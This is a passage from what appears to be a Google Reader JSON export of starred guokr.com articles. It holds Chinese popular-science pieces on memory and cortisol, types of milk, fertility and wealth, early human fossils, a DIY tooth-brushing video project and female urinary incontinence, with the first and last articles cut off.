alt=\"图中“结构”的含义：是否需要精确的指导。该因素随着年龄的增长而影响力逐渐减小/ilsa-learning-styles.com\"><p>图中“结构”的含义：是否需要精确的指导。该因素随着年龄的增长而影响力逐渐减小/ilsa-learning-styles.com</p></div>\n<p>你会注意到，在这个学习模型中，时间只是21种影响因素中的1种。需要指出的是，除此之外，还有众多的学习模式模型。介绍这个学习模式，是因为它比较简单易懂，能够给人一个比较基础的印象。当然，并非所有人的学习模式都被这全部21种元素所左右。其中的6-14种元素(从服从/责任感至多样学习方式)被认为是最主要的影响因子（这当中也包括时间）。但由于影响学习的因素众多，受影响的程度又因人而异，单纯把其中一个或几个影响因素列为对每个人最重要的因素是不恰当的。</p>\n</div>\n<div>\n<h1>激素对记忆力的影响</h1>\n<p>让我们再回到一天记忆力最好的时间的讨论上来。体内激素伴随着人的作息而产生的节律性变化，对于学习与记忆的影响，是近些年的一个热点研究对象。目前的研究已经从直接做实验比较人在不同时间段的记忆力，转变为通过测量人的压力应激激素（stress related hormone）在一天中的不同水平，间接地分析记忆力随着时间的变化。以最主要的压力应激激素——皮质醇（俗名可的松）为例，通常情况下，皮质醇在苏醒后45分钟分泌达到峰值。它的作用是让人苏醒并且刺激新陈代谢，让体内的能量物质开始分解，为开始全新的一天提供能量。此后，皮质醇水平迅速降低直到午饭时间。午饭后，皮质醇水平的降低速度趋于缓慢。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/h7/bn/ot/h7bnot.png\" alt=\"一个作息规律的人一天中皮质醇的变化/psycnet.apa.org\"><p>一个作息规律的人一天中皮质醇的变化/psycnet.apa.org</p></div>\n<p>但是对于夜猫子来说，一旦长期的夜行昼伏的生活养成，他们体内的激素变化又是另一幅情景：不会出现一个明显的醒后的高峰，一天中下降的程度也很微弱，而且晚上还会出现反弹。</p>\n<p>没有人是天生的夜猫子，人类的身体被设计成到了夜晚就自动关闭。尽管有些人可以在深夜和凌晨依然保持清醒，这种习惯却常常为身体带来一些影响。如果你是一只夜猫子，你的身体会逐渐丧失这种到了夜晚就自动关闭的功能，甚至会在所有人都进入睡眠时得到第二个清醒刺激。这种刺激也许是来源于电脑屏幕或者电视机屏幕的人造光源，就像咖啡因一样，成为你不眠的动力。时间长了，这种被反复激活的皮质醇水平会导致剧烈的压力反应，并且使得你更加难以入睡。</p>\n<p>虽然皮质醇对于记忆力没有直接的影响，但是它很有可能间接地通过影响情绪相关的激素或神经递质——例如肾上腺素，从而影响到学习效率。大量的研究发现，较高的皮质醇对于新记忆的形成有一定增强作用，这显然跟高浓度的皮质醇保持大脑清醒有关。</p>\n<p>但是，高浓度的皮质醇同样也是一把双刃剑。在记忆提取阶段，压力导致的高浓度皮质醇却会妨碍记忆的提取，使人更容易什么也想不起来。大概这就是为什么紧张的学习环境对提高学习效率相对有利，但是考试的时候太紧张就很悲剧的原因。并且，长期处于高强度的压力刺激下，会导致一系列心理性和神经性疾病的发生。</p>\n<p><strong>结论：</strong></p>\n<p>每天记忆力最好的时候是因人而异的，不应该一概而论。如果你觉得自己下午或晚上的记忆力更佳，那就不必在没有得到足够的休息时，为了背单词或公式专门早起。但是保持一个正常和规律的作息能保证体内激素的稳定，使得学习的效率不会受到身体激素剧烈波动的影响。谣言粉碎机的建议是，无论你几点起床，把握好起床后的那段时间还是比较重要的，毕竟那时你的大脑尽一切努力让你清醒，并且准备好身体机能以应付即将到来的一整天。</p>\n<p><strong>参考资料：</strong></p>\n<p>Wolf, O.T., The influence of stress hormones on emotional memory: relevance for psychopathology. Acta Psychol (Amst), 2008. 127(3): p. 513-31.</p>\n<p><a href=\"http://suite101.com/article/best-time-of-day-to-learn-a3315\">http://suite101.com/article/best-time-of-day-to-learn-a3315</a></p>\n</div>\n</div>"
    },
    "author" : "影歌",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1348169047831",
    "timestampUsec" : "1348169047831967",
    "id" : "tag:google.com,2005:reader/item/85c8c97f847dbf76",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "人不同，奶有别",
    "published" : 1348169047,
    "updated" : 1348169047,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/341675/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>俗话说，一样米养百样人。但不同的人对“奶”的需求可是不一样的，别乱想，我们说的是不同的乳制品，或者说牛奶。爱瘦之人喝低脂奶，乳糖不耐可以从低乳糖奶开始，还有青少年、老年人需要不同的营养强化奶。什么人喝什么样的奶，还得细聊……</p>\n<div>\n<h1>要身材还是要口感——低脂奶</h1>\n<p>按照乳脂肪含量的不同，牛奶可以分为全脂奶（脂肪含量为3.5%-4.5%）、半脱脂奶（1.0%-3.5%）和脱脂奶（一般低于0.04%）。以每次饮用250mL全脂牛奶计算，其中的脂肪大约会为了我们带来80kcal左右的热量（大概步行十几分钟就能消耗掉），占每个人每天所需脂肪的10%以上。如果再加上下午茶时间150mL酸奶的话，这些热量对于一个力图保持完美身材的人来说可就不容小觑喽！因此，低脂奶或脱脂奶往往为姑娘们所偏爱。</p>\n<p>不过，牛奶中对风味影响最大的成分也是脂肪。作为组成和结构最复杂的脂类物质，乳脂肪怀揣着400多种脂肪酸的丰富内涵，赋予了牛奶浓郁独特的香气和饱满醇厚的口感。因此，脱去乳脂肪的牛奶味道会比较寡淡，即便添加了一部分食用香精，也绝对比不上全脂奶的在嗅觉和味觉上的丰盛体验。（换个角度，对于某些“不爱喝奶”的同学，低脂奶或许值得一试哦！）</p>\n<div><img src=\"http://img1.guokr.com/gkimage/n1/ck/p8/n1ckp8.png\" alt=\"不过，在除掉脂肪的同时，牛奶中的脂溶性维生素也不得不陪葬，维生素D首当其冲。这也许就是“瘦身”的代价吧。\"><p>不过，在除掉脂肪的同时，牛奶中的脂溶性维生素也不得不陪葬，维生素D首当其冲。这也许就是“瘦身”的代价吧。</p></div>\n</div>\n<div>\n<h1>喝奶不泻慢慢练——低乳糖奶</h1>\n<p>敢不敢咚咚咚一口气喝下一整杯牛奶？肚子开始咕噜咕噜闹情绪了吗？嘿嘿，别担心，你不是一个人！</p>\n<p>大多数亚洲成年人或多或少都有些乳糖不耐。事实上从断奶开始，我们合成乳糖酶的能力就已经开始退化了，对乳糖的分解能力也随之降低。滞留在肠道中的乳糖被细菌分解，产生大量气体，从而造成各种尴尬局面，甚至让你频频奔向卫生间。</p>\n<p>幸运的是，乳糖酶合成能力的退化并非完全不可逆转，循序渐进的“锻炼”还是会带来进步的。除了我们熟悉的酸奶，乳糖不耐症患者还可以从低乳糖奶开始，重拾你身体的“牛奶记忆”。尽管不同品牌的低乳糖奶叫法各异，但原理上都是采用乳糖水解技术，在工厂提前帮你“消化”了大部分难缠的乳糖分子，既没有营养损失，又不会闹肚子，让你没有理由拒绝牛奶。配合饮用量的增加，用不了多久，你的乳糖酶合成体系就可以恢复一部分的劳动能力啦！</p>\n</div>\n<div>\n<h1>给牛奶加点料——营养强化奶</h1>\n<p>在日常饮食中，牛奶是最好的钙质来源之一，无论是游离钙（约占总数的1/3）还是酪蛋白酸钙-磷酸钙复合体（约占2/3），都非常适合人体消化吸收，吸收率可以高达32%。而高钙奶则起到了锦上添花的作用——虽然添加进去的钙质成分由于结构不同在“质量”上要逊于乳钙，不过35%左右的“数量”优势还是显而易见的。同时，许多牛奶厂商还在高钙奶中还添加了维生素D，起到了促进钙质吸收、调节血钙平衡的作用，可谓相得益彰。对于正值青春期的少年、准妈妈和乳母，以及钙质流失加剧的中老年人，高钙奶都是不错的选择。</p>\n<p>除了老生常谈的钙和VD，牛奶中的营养强化剂还有其他许多类型。例如：多种维生素和矿物质，为人体正常生理活动所必需，适合代谢旺盛的青少年；乳铁蛋白，具有一定的抗菌、抗病毒活性，适合抵抗力较弱的小朋友；DHA、EPA等多不饱和脂肪酸，是视网膜和神经系统的重要组成部分，儿童、老年人以及脑力劳动者都可以适当补充。另外由于现代都市人的“方便”需要，可溶性膳食纤维也被越来越多地被添加到牛奶当中，它可以帮助肠道功能欠佳的朋友增强肠道蠕动，预防和改善便秘问题。</p>\n</div>\n<div>\n<h1>早餐口味多——调味奶</h1>\n<div><img src=\"http://img1.guokr.com/gkimage/f8/xg/17/f8xg17.png\" alt=\"各种口味的牛奶尽管不会增加多少“营养”，但可以使选择更为丰富。\"><p>各种口味的牛奶尽管不会增加多少“营养”，但可以使选择更为丰富。</p></div>\n<p>对于大多数饮用者来说，牛奶还是在早餐中最为常见，于是符合大家饮食习惯的五谷杂粮纷纷进军“乳坛”。此外，为了迎合中国人的口味，国产牛奶品牌还有红枣、蜂蜜、核桃、花生等诸多口味的调味奶供大家选择。虽然不能指望这些成分具有什么神奇功效，不过时常换换口味、哄自己好好吃早饭还是非常具有现实意义的。</p>\n<p>顺便提醒一句，所有添加到牛奶当中的非乳成分或多或少都会影响乳浊液体系的平衡，因此配料表中会“附赠”一些稳定剂、乳化剂等成分。不过，不用担心。食品添加剂并不可怕，只要按照标准正常使用，不会对人体造成不良影响。</p>\n<p>以上说的这些牛奶品种，往往不会“单边作战”，还会互相调配组合成“搭档”，比较常见的有高钙+低脂、低乳糖+膳食纤维强化、麦香+维生素强化等等，一下子，又让牛奶的种类多出许多。所以，明天喝什么奶，你选好了吗？</p>\n</div>\n</div>"
    },
    "author" : "内啡肽",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1348169043932",
    "timestampUsec" : "1348169043932546",
    "id" : "tag:google.com,2005:reader/item/30f9a18f882a16f7",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "为什么穷国的生育率比富国高？",
    "published" : 1348169043,
    "updated" : 1348169043,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/342652/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<img alt=\"http://img1.guokr.com/gkimage/lu/n3/5i/lun35i.png\" src=\"http://img1.guokr.com/gkimage/lu/n3/5i/lun35i.png\">\n<p>家庭越富有，规模也越小，这一人口结构转型是现代历史最显著的现象之一。随着经济发展，出生率放缓，马尔萨斯有关人口压力导致粮食危机的预言或将难以成真：短期内，技术的发展会规避粮食短缺的问题；长期来看，人口数量会触及一个天花板，人类也将得以幸存。世界人口现在有 70 亿，在本世纪末这个数字会稳定在超出 100 亿一点点。</p>\n<p>不过，这种现象为何发生，一直难以索解，因为其他物种在生存环境改善后，生育率只会提高而非降低。生物学家对人类生育问题的一般解释是：人类会根据环境变化选择生育策略，其一为生态学家所谓 “r 选择”（r-selection），即大量生育，但对每个后代都投入很少，这在婴儿死亡率高的环境中奏效；其二为 “K 选择”（K-selection），即生育数量少，但对后代个体的投入很大，以使后代具有更高的竞争力，从而比其他同辈人生育更多孙辈。</p>\n<p>人口结构转型实际就是由 r 选择向 K 选择转变的过程。然而，伦敦卫生和热带医学院的安娜•古德曼（Anna Goodman）和同事最近在《皇家学会会刊》上发表论文指出，K 选择在现代社会并没有产出成果。家庭生育数量少了，对后代个体投入也大了，得到的孙辈却并没有增多。</p>\n<p>为了检验这一想法，古德曼考察了在瑞典中部城市乌普萨拉（Uppsala）的一个群体，总共大约有 1.4 万人。这些人都是在 1915年 - 1929 年间出生于乌普萨拉大学医院，他们及其后代的收入和社会经济地位、生育情况等等信息，瑞典政府都进行了准确记录。古德曼便是以此作为基本资料进行了研究。</p>\n<p>古德曼发现，缩小家庭规模确实能够提高后代的竞争力——子孙辈的学校成绩更好、大学入学率更高、成年后收入更高，但并没有出现生育率的提高，没有带来任何明显的演化益处。缩小后的家庭把更多的资源投入在自己身上，而不是繁殖下一代，K 选择模式对子孙基因库的贡献逐代减弱。</p>\n<p>这给生物学家带来了很多疑问。如果 K 模式没有产出成果（即更多子孙），那从一开始就不应该存在才对。有一种可能的解释：K 模式之所以不再生效，也许是因为远古时期延续下来的心理模式不再适用于与现代社会的情境。这种解释有可信之处，发达社会儿童死亡率几近于零，人类采取 r 模式策略也未尝不可，换言之，K 模式对 r 模式不再有优势。</p>\n<p>好在不同于肥胖症（古代心理机制不适应现代资本主义丰富物质环境的又一个例子），家庭规模变小并不会对家庭个体造成什么危害。而从更广泛的意义上说，人口结构转型可能是唯一挡在人类走向生态危机这条灭亡之路上的东西。</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>编译自:</th><td>《经济学人》，More or less - Why, as people get richer, do they have fewer children?</td>\n</tr>\n<tr><th>文章图片:</th><td>The Economicist</td>\n</tr>\n</tbody>\n</table>\n</div>"
    },
    "author" : "Argus",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1348169040094",
    "timestampUsec" : "1348169040094473",
    "id" : "tag:google.com,2005:reader/item/707c184a1db2c4d3",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "人类的家系究竟是怎样的？",
    "published" : 1348169040,
    "updated" : 1348169040,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/342603/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>对于我们智人（ <em>Homo sapiens</em> ）而言，最奇怪的事情之一是： 我们是孤独的。讲故事的小说家们给这个世界带了许许多多想象中的人属生物（hominids），比方说森林里的树精或是深山中的巨人；但人们从来都没有真的发现过这些东西。</p>\n<p>不过，历史上并非如此：在距今 4 万余年前，地球上还存在着其他 3 个人类物种：在欧洲生活着的尼安德特人（Neanderthals），在印度尼西亚生活的被称作 “霍比特人” 的弗洛勒斯人（Flores），以及最近才发现的、曾经生活在亚洲中部的、依旧让古人类学家们难以捉摸的一种人类：丹尼索瓦人（Denisovans）。最近的研究表明，类似的人种多样性在人类历史上更早期也存在过，那是在大约 200 万年前的非洲。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/93/x4/nk/93x4nk.png\" alt=\"在人类发展的早期，存在着许多独立的种属（图片：fhs-bio-wiki.pbworks.com）\"><p>在人类发展的早期，存在着许多独立的种属（图片：fhs-bio-wiki.pbworks.com）</p></div>\n<div>\n<div><br></div>\n</div>\n<div><img src=\"http://img1.guokr.com/gkimage/42/k5/ct/42k5ct.png\" alt=\"1. 能人，2. 智人，3. 弗洛勒斯人（霍比特人），4. 直立人，5. 鲍氏傍人（化石标本是利基博士的母亲玛丽于 1959 年在坦桑尼亚奥杜韦峡谷发现，可能是最早使用石器的人科生物），6. 海德堡人，7. 尼安德特人（图片：theage.com.au）\"><p>1. 能人，2. 智人，3. 弗洛勒斯人（霍比特人），4. 直立人，5. 鲍氏傍人（化石标本是利基博士的母亲玛丽于 1959 年在坦桑尼亚奥杜韦峡谷发现，可能是最早使用石器的人科生物），6. 海德堡人，7. 尼安德特人（图片：theage.com.au）</p></div>\n<div>\n<div><br></div>\n</div>\n<p>在《自然》（Nature）杂志前不久刊发的一篇论文中，肯尼亚内罗毕图尔卡纳盆地研究所的米芙•利基（Meave Leakey），她所领导的研究团队提供了相关证据。</p>\n<p>利基一家是一个著名的古生物学家族。她的丈夫，理查德（Richard）早在 1967 年就发现图尔卡纳湖（Lake Turkana）附近的地域蕴藏着大量的人类化石，并在此得出了许多重要的研究成果。更早些时候，理查德的父母路易斯（Louis）和玛丽（Mary），在坦桑尼亚奥杜瓦伊峡谷（Olduvai Gorge）的发现，对人类学考古起了重大推动作用（编注：即上图鲍氏傍人的化石标本）。在 1999 年，利基博士本人则发现了了古人类的一个新种，并命名为肯尼亚平脸人（ <em>Kenyanthropus platyops</em> ）。 这种古人类生活的年代是大约 350 万年前，要比人属（Homo）——现代人类就属于这个种属——出现得更早。而她最新的化石发现，则应当被归入人属。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/eo/2o/w3/eo2ow3.png\" alt=\"利基博士（左）和她女儿露易丝在仔细地观察新发现的标本 KMN-ER 62000（图片：washingtonpost.com）\"><p>利基博士（左）和她女儿露易丝在仔细地观察新发现的标本 KMN-ER 62000（图片：washingtonpost.com）</p></div>\n<div>\n<div><br></div>\n</div>\n<p>研究古人类化石时遇到的最大困难是，这些化石的分布过于分散和稀疏。这里有着一块下颚骨，那里躺着一块脑壳。而且，人们经常无法断定，这几块各式各样的骨头，究竟是来自同一个物种还是好几个物种。甚至同一部位骨头的多块样本也会带来误导。有时候，两块看起来是两个物种的骨头，也许其实分别是来自同一物种的男性和女性个体的。</p>\n<p>类似的混乱情况严重困扰了图尔卡纳湖附近发现的人类化石的研究工作。一些古人类学家认为他们看到的是同一个物种——能人（ <em>Homo habilis</em> ）的化石，只不过种内差异比较大；而另外一些古人类学家认为，这些化石里应该还有卢多尔夫人（ <em>Homo rudolfensis</em> ）。利基博士和她的团队（其中还包括利基世家的第三代传人——她的女儿路易斯［Louise］）新发现的化石，或许会让迷局变得更加明朗一些。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/xd/6o/75/xd6o75.png\" alt=\"［左］新发现的下颚骨样本和卢多尔夫人的上颚骨和十分吻合。［右］而这块上颚骨和先前被认定是卢多尔夫人的下颚骨并不吻合。（图片：The Economist）\"><p>［左］新发现的下颚骨样本和卢多尔夫人的上颚骨和十分吻合。［右］而这块上颚骨和先前被认定是卢多尔夫人的下颚骨并不吻合。（图片：The Economist）</p></div>\n<div><img src=\"http://img1.guokr.com/gkimage/di/o3/h4/dio3h4.png\" alt=\"KMN—ER60000 的真相（图片：futurity.org）\"><p>KMN—ER60000 的真相（图片：futurity.org）</p></div>\n<div>\n<div><br></div>\n</div>\n<p>其中一个新标本的编号为 KMN-ER62000，它的面部特征很像卢多尔夫人的模式标本（所谓模式标本，就是用来定义物种特征的那个标本——如果它真的是一个独立的物种的话）；但是这个标本是来自一个少年，而卢多尔夫人的模式标本却是成年人的标本。其中最关键的因素是，标本 62000 拥有着保存得相当完好的上颚，而模式标本则缺少了这一部分。但计算机进行的重建结果（见上图）显示：通过计算机重建得出的上颚骨的特征和利基博士发现的另一个下颚骨（KMN-ER60000）相当吻合。她并不是说这些骨骼化石来自同一个体，毕竟它们属于不同年龄的人；但看起来，这些样本确实是来自同一个物种，就是被称为卢多尔夫人（ <em>Homo rudolfensis</em> ）的古人种。</p>\n<p>同样意义深远的是，另外一个独立的计算机复原结果表明：标本 62000 的上颚骨，与出土自同一地域的另外一块著名标本（KMN—ER1802）不吻合。这块标本在 1973 年被发现，过去曾被认为很可能是属于卢多尔夫人的一块下颚骨。</p>\n<p>那么，标本 1802 到底是属于谁的呢？ 现在依旧难以断定。除非该人种男性和女性间的个体差别和其它任何一种人类的表现规律都不同，不然 1802 的性别特征和推断出的卢多尔夫人特征相差太大。不过，之前这块样本之所以归给卢多尔夫人，原因正是它不像能人（ <em>Homo habilis</em> ）的骨骼。</p>\n<p>这么看来，在 200 万年前的东非大草原上，很可能生活着至少两种、甚至 3 种不同的人类（Homo）：能人（\n<em>habilis</em> ）、卢多尔夫人（ <em>rudolfensis</em> ），以及某种还未被命名的人种。就像利基博士的学术家系一样，人类家族早期盘综错节的恢宏历史，看来要变得越来越复杂隐晦了。</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>编译自:</th><td><strong>Ask the family - Human ancestry has just got more complicated</strong></td>\n</tr>\n<tr><th>刊发信息:</th><td>《经济学人》，2012年8月11日</td>\n</tr>\n<tr><th>文章图片:</th><td>见图片标注</td>\n</tr>\n</tbody>\n</table>\n</div>"
    },
    "author" : "Drink-Me",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1348169035378",
    "timestampUsec" : "1348169035378006",
    "id" : "tag:google.com,2005:reader/item/e93c3402c3eb7710",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "【爱牙日特辑】自制微电影教你巴氏刷牙法！",
    "published" : 1348169035,
    "updated" : 1348169035,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/342649/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<img alt=\"http://img1.guokr.com/gkimage/ul/fl/my/ulflmy.png\" src=\"http://img1.guokr.com/gkimage/ul/fl/my/ulflmy.png\">\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>DIYer:</th><td>秋秋、神丙、灰色泰迪熊、Greeny</td>\n</tr>\n<tr><th>制作时间:</th><td>3天</td>\n</tr>\n<tr><th>制作难度:</th><td>★★☆☆☆</td>\n</tr>\n<tr><th>GEEK指数:</th><td>★★★☆☆</td>\n</tr>\n</tbody>\n</table>\n<div>\n<div><br></div>\n</div>\n<p>今天是全国爱牙日，你的认真刷牙了吗？不要以为刷足3分钟就可以了哦，不正确的刷牙方法，很有可能刷坏牙齿，并引起口腔疾病。</p>\n<p>所以，果壳DIY联合健康朝九晚五共同制作了一个大号的牙齿模型，并邀请山魈君和松鼠酱出演，拍摄制作了巴氏刷牙法（Bass Method）的微电影。爱它，就为它学习巴氏刷牙法吧！</p>\n<iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://player.youku.com/player.php/sid/XNDUzMDA1MTky/v.swf&amp;width=480&amp;height=400\" width=\"480\" height=\"400\"></iframe><div>\n<div><br></div>\n</div>\n<p>相关阅读：<a href=\"http://www.guokr.com/article/220/\">让刷牙不再纠结</a></p>\n<div>\n<div><br></div>\n</div>\n<div>\n<h1>制作过程</h1>\n<div>\n<h2>工具和材料</h2>\n<ul>\n<li>烤箱</li>\n<li>剪刀</li>\n<li>美工刀</li>\n<li>软陶（粉红、白色）</li>\n<li>粉红色毛巾</li>\n</ul>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h2>牙齿模型</h2>\n<img alt=\"http://img1.guokr.com/gkimage/d2/64/g5/d264g5.png\" src=\"http://img1.guokr.com/gkimage/d2/64/g5/d264g5.png\">\n<p>根据参考书设计等比例放大版模型。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/2b/j9/2f/2bj92f.png\" src=\"http://img1.guokr.com/gkimage/2b/j9/2f/2bj92f.png\">\n<p>切割软陶，捏成不同牙齿的形状。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/g5/m7/1f/g5m71f.png\" src=\"http://img1.guokr.com/gkimage/g5/m7/1f/g5m71f.png\">\n<p>窝沟等细节处进行深加工。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/p0/tz/hv/p0tzhv.png\" src=\"http://img1.guokr.com/gkimage/p0/tz/hv/p0tzhv.png\">\n<p>一大堆捏好的牙齿们。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/8b/l4/5l/8bl45l.png\" src=\"http://img1.guokr.com/gkimage/8b/l4/5l/8bl45l.png\">\n<p>用锡纸包好捏好的模型。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/t8/67/6m/t8676m.png\" src=\"http://img1.guokr.com/gkimage/t8/67/6m/t8676m.png\">\n<p>放进烤箱，烤45分钟。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/y0/hb/d4/y0hbd4.png\" src=\"http://img1.guokr.com/gkimage/y0/hb/d4/y0hbd4.png\">\n<p>热腾腾的出锅啦！</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/08/2z/02/082z02.png\" src=\"http://img1.guokr.com/gkimage/08/2z/02/082z02.png\">\n<p>同样的方法做出牙龈。</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h2>山魈布偶改造</h2>\n<img alt=\"http://img1.guokr.com/gkimage/28/84/40/288440.png\" src=\"http://img1.guokr.com/gkimage/28/84/40/288440.png\">\n<p>大家还记得我们制作的这位 <a href=\"http://www.guokr.com/article/72979/\">爱咆哮，爱稿汁的山魈君</a> 吗？为了这次演出，山魈君可是做了不小的牺牲的……</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/d4/l5/3t/d4l53t.png\" src=\"http://img1.guokr.com/gkimage/d4/l5/3t/d4l53t.png\">\n<p>之前的设计是不能张嘴的，所以我们用粉红色的毛巾为山魈君增加一个口腔。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/ni/57/h8/ni57h8.png\" src=\"http://img1.guokr.com/gkimage/ni/57/h8/ni57h8.png\">\n<p>用剩下的毛巾做条舌头。</p>\n<div>\n<div><br></div>\n</div>\n<img alt=\"http://img1.guokr.com/gkimage/fg/74/vm/fg74vm.png\" src=\"http://img1.guokr.com/gkimage/fg/74/vm/fg74vm.png\">\n<p>假牙装好啦，快给你的牙齿洗洗澡吧！记得用巴氏刷牙法哦！</p>\n<div>\n<div><br></div>\n</div>\n<p>果壳DIY站QQ群：132647923, 2群：179240860，3群：155086317（加入时请报上你在果壳的个人主页地址，以防广告ID）</p>\n<p>果壳DIY站微博: <a href=\"http://t.sina.com.cn/guokrdiy\">http://t.sina.com.cn/guokrdiy</a></p>\n</div>\n</div>\n</div>"
    },
    "author" : "Greeny",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1347940610726",
    "timestampUsec" : "1347940610726387",
    "id" : "tag:google.com,2005:reader/item/34b37d423384f188",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "女性尿失禁是怎么回事？",
    "published" : 1347940610,
    "updated" : 1347940610,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/339014/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>潮吹，是群众喜闻乐见的现象，但是，当液体不是在使尽解数后喷涌而出，而是在不经意间涓滴细流时，就会变成一个不大不小的麻烦(当然，这里就是打个比方，潮吹液和尿液不是一回事)。尿失禁是困扰不少女性的问题，虽然对健康的直接影响并不算严重，但是“老湿”这个事也足够闹心了，这会直接影响到平日的生活质量、感情状态、身体形象以及性生活。根据美国医疗质量与医疗研究中心的数据，1300万以上的美国人患有尿失禁的问题[1]，而其中85%是女性。[2]</p>\n<div>\n<h1>失禁不少见</h1>\n<p>人体储存尿液的地方位于膀胱，尿液通过尿道排出体外。排尿时膀胱壁的肌肉收缩，将尿液“挤”出膀胱，进入尿道，同时尿道括约肌放松，让尿液能够顺利排出体外，所以当控制排尿的神经开小差、膀胱肌肉突然收缩或是尿道括约肌的“把门”时不给力的话，就会出现尿失禁的情况。\n当你感觉到自己无法控制尿液的排出的时候，可能就意味着尿失禁已经找上门了。大多数情况下，只会是很微量的一两滴，当然，也会偶尔有比较不幸的流量过大的情况……不过，可别以为失禁是只发生在自己身上的倒霉又丢人的事情，这事比你想的要普遍得多。\n在美国，大约25%-45%的女性经受着尿失禁问题的折磨。可不要以为尿失禁是中老年女性的专属问题，事实上，受到运动损伤或是肌肉损伤遗传因素的影响，女性患者中，有20%-30%的患者是年轻人。[1]</p>\n</div>\n<div>\n<h1>失禁有区别</h1>\n<p>短期尿失禁可能只是由于泌尿系统感染，药物副作用或是便秘所造成，稍作调整或是治疗就可以痊愈[3]。比较顽固的尿失禁问题主要包括两类，压力性尿失禁（Stress incontinence）和急迫性尿失禁（Urge incontinence）。</p>\n<p>压力性尿失禁是最常见的膀胱控制性问题，是指在打喷嚏，咳嗽，大笑，慢跑、颠簸或是其他情况下，形成了对于膀胱的压迫，最终导致“不能自抑”。通常，压力性尿失禁的尿量不会很大。盆底肌拉伤可能是造成这一问题的罪魁祸首，盆底肌是封闭骨盆底的肌肉群，这一肌肉群犹如一张“吊网”，尿道、膀胱、阴道、子宫、直肠等脏器被这张“网”紧紧吊住。当盆底肌受损，一旦这张“网”弹性变差，“吊力”不足，便会导致“网”内的器官无法维持在正常位置，这时，控制尿道开闭的肌肉就会受到相应的影响。生育、体重增加、或是剧烈运动等都可能造成的盆底肌的损伤。</p>\n<p>急迫性尿失禁是指患者有突然强烈的需要上厕所的冲动，结果在冲到厕所之前就放水了。当然，这并不是指发生在憋尿时间太久的“陈酿”状态下，而是说很少的尿量也会导致这样的情况。也有患者在“事已至此”之前根本不会有任何的感觉。</p>\n<p>一些患有急迫性尿失禁的患者出现的状况会比较严重，尿量可能更大，会浸湿裤子或是沿着腿顺流而下。诸如多发性硬化症，帕金森症，或是尿道感染均可能诱发急迫性尿失禁。[1]\n当然，在实际生活中，上述两种情况的区别可能并不甚明显。芝加哥洛约拉大学斯特里奇医学院女性盆腔医学教授布鲁贝克（Linda 